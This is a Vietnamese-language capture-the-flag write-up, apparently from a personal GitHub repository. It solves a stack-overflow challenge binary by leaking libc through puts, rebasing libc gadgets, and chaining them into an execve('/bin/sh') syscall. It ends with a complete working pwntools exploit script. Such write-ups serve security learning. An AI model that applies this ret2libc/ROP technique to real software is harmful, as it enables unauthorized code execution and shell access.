# RET2LIBC + ROPchain

*đây là 1 bài của task3 nhưng được giải bằng cách khác kết hợp giữa **ret2libc và Ropchain***

**ida:**

![image](https://github.com/gookoosss/CTF.-/assets/128712571/cd1a157e-0ec9-45f5-a2e9-39280f4aa39d)


**checksec và vm:**

![image](https://github.com/gookoosss/CTF.-/assets/128712571/1a66371c-2fee-4ae3-b1c4-368fb103aa61)


**ở đây ta thấy PIE đóng nên ta có thể dùng được ROPchain**

nhưng mà ở đây lại xuất hiện 1 vấn đề đó là đề không cho ta đầy đủ các pop ta cần

![image](https://github.com/gookoosss/CTF.-/assets/128712571/7f011842-c7c8-44cf-a835-e60498242fac)


sau 1 một hồi suy nghĩ thì **ta còn 1 cách là lấy các pop rdx , pop rax  và syscall trong file libc mà đề cho sẵn** vì trong file libc ta đã có đầy đủ những ta cần 


![image](https://github.com/gookoosss/CTF.-/assets/128712571/011df66d-6844-4678-abef-26dab565f9ce)


ở đây thì ta lấy pop rdx và pop r12 là **0x000000000011f497**

![image](https://github.com/gookoosss/CTF.-/assets/128712571/738f8cf4-83cd-40f0-a5f7-66e8ae929b69)


ta lấy pop rax là **0x0000000000045eb0**

oke bây giờ đã có đầy đủ các pop quan trọng mà mình cần rồi, bây giờ làm như dạng ropchain bình thường thôi

**lưu ý:**
- để có thể gán /bin/sh vào rdi từ file libc thì ta cần phải leak được địa chỉ base của libc
- để thuận tiện cho việc làm thì ta nên leak địa chỉ libc ra 
- ở bước này mình sẽ copy từ task3 để tiện, còn giải thích chi tiết thì ở bài task 3 nha



![image](https://github.com/gookoosss/CTF.-/assets/128712571/ef310a7d-00db-4110-869a-b87a4c91ea78)


oke bây giờ ta làm như bình thường theo cách ROPchain là được

![image](https://github.com/gookoosss/CTF.-/assets/128712571/fe3e3284-dc89-45b1-8fdc-c32372172d68)


chạy thử xem sao 

![image](https://github.com/gookoosss/CTF.-/assets/128712571/224d4c1e-fb8d-45f7-aa9e-d8c18d0da048)




hmm ko như ta mong đợi rồi , debug lại xem sao 

**ta thử để ý r15 thì thấy nó đang chứa pop_rdx_r12** 

![image](https://github.com/gookoosss/CTF.-/assets/128712571/b1360ba2-b2f5-4a05-8152-76f04c7c54fd)


chứng tỏ là ta đã quên ko gán giá trị cho **r15** nên nó đã lấy **pop_rdx_r12** gán vào, sau đó hàm ret sẽ trả về địa chỉ 0 nên ko chính xác

**để giải quyết vấn đề ta cần gán giá trị cho r15 và r12(ở pop_rdx_r12) là p64(0) luôn** 

![image](https://github.com/gookoosss/CTF.-/assets/128712571/dfbd4d54-f0fd-47df-9c54-9773da614231)

chạy lại lần nữa xem sao

![image](https://github.com/gookoosss/CTF.-/assets/128712571/445aa5d5-c241-4bf6-aca6-13fe5078106d)


uầy lỗi tiếp rồi



**hmm như các bái ropchain khác thì bình thường hàm ret sẽ trả về địa chỉ của pop tiếp theo và chạy tiếp , nhưng ở đây thì hàm ret đã nhận được đúng địa chỉ của pop_rdx_r12 nhưng lại không chạy được**

***sau một hồi nghiên cứu thì mình hiểu được là:***

- ở đây **pop_rdx_r12** ko phải là 1 địa chỉ mà là 1 offset
- hàm ret nhận 1 cái offset không phải địa chỉ nên không hiểu và không trả vể
- cái **pop_rdx_r12** ta lấy ra từ file libc là 1 offset nên trỏ đến địa chỉ của pop rdx + r12 đúng thì ta cần lấy **địa chỉ base của libc + offset = địa chỉ pop**

địa chỉ base ta đã leak được ở trên nên ta dùng luôn **libc.address + offset tìm được trên libc = địa chỉ pop ta cần**


**script :** 


```
from pwn import *

p = process('./libleak_patched')
exe = ELF('./libleak_patched')
libc = ELF('libc.so.6')

pop_rdi = 0x0000000000401313


payload = b'a'*88 
payload += p64(pop_rdi) + p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(exe.sym['main'])

p.sendlineafter(b'Give me something useful: ', payload)

libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - libc.sym['puts']
log.info("libc leak: " + hex(libc_leak))
log.info("libc base: " + hex(libc.address))

gdb.attach(p, gdbscript = '''
b*main+158
c
''')

input()

pop_rsi_r15 = 0x0000000000401311
pop_rdx_r12 =  libc.address + 0x000000000011f497
pop_rax = libc.address +  0x0000000000045eb0
syscall = libc.address + 0x0000000000029db4
ret_addr  = 0x000000000040101a


payload = b'a'*88
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(pop_rsi_r15) + p64(0) + p64(0)

payload += p64(pop_rdx_r12) + p64(0) + p64(0)
payload += p64(pop_rax) + p64(0x3b)
payload += p64(syscall)


p.sendlineafter(b'Give me something useful: ', payload)


p.interactive()
```

chạy lại thử xem sao 

![image](https://github.com/gookoosss/CTF.-/assets/128712571/dbfbb205-b91a-485e-a97a-b8c23311f839)


**đến đây ta ko còn lỗi trên nữa nè** 

![image](https://github.com/gookoosss/CTF.-/assets/128712571/a219dfa0-0136-485d-ba7d-d9619296b791)


ra được rồi hehe





